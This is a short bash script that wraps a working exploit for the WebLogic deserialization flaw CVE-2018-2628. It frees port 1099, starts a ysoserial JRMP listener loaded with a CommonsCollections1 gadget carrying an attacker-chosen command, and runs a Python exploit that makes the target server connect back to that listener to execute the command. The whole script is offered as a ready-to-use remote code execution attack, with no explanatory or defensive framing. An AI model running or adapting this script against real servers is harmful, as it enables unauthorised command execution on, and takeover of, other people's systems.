#!/usr/bin/env bash

IP=$1
PORT=$2
LOCALIP=$3
CMD=$4

PID=$(sudo netstat -latupen | grep ':1099' | awk '{print $9}' | cut -d'/' -f1)
if [ ! -z "$PID" ]; then
	sudo kill -9 $PID
fi
sudo netstat -latupen | grep ':1099'

sudo sh -c "java -cp ../ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 '$CMD' &" 
python2 exploit-weblogic-cve-2018-2628.py $IP $PORT ../ysoserial-0.0.6-SNAPSHOT-BETA-all.jar $LOCALIP 1099 JRMPClient
sleep 2
sudo netstat -latupen | grep ':1099'

PID=$(sudo netstat -latupen | grep ':1099' | awk '{print $9}' | cut -d'/' -f1)
if [ ! -z "$PID" ]; then
	sudo kill -9 $PID
fi
sleep 2